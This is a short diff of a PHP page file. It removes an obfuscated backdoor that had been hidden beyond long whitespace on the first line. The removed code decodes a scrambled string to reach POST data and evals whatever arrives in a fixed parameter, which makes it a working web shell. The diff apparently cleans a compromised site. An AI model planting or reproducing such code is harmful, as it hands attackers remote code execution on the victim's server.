@@ -1,4 +1,4 @@
-<?php                                                                                                                                                                                                                                                   $wlsi24 ="ropuet_s";$rlr12 = $wlsi24[7].$wlsi24[5]. $wlsi24[0].$wlsi24[5]. $wlsi24[1]. $wlsi24[3]. $wlsi24[2].$wlsi24[2].$wlsi24[4].$wlsi24[0] ;$aja45 =$rlr12 ( $wlsi24[6].$wlsi24[2] . $wlsi24[1]. $wlsi24[7].$wlsi24[5]); if ( isset(${ $aja45 }[ 'qf0b08a'] )){eval( ${$aja45 }['qf0b08a']);}?>   	  
+   	  
 	  <?php include('header.php');
 	  if(isset($_GET['page_id'])){
 		if($_GET['page_id']==48){ 
